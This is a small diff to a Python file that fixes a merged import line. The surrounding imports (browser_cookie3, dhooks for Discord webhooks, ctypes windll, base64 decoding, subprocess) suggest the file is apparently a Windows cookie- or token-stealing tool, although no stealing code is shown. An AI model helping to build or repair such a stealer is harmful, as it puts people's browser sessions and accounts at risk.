@@ -21,7 +21,8 @@ import socket
 import subprocess
 import threading
 import dhooks
-import requestsimport browser_cookie3
+import requests
+import browser_cookie3
 from base64 import b64decode
 from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
 from json import dumps
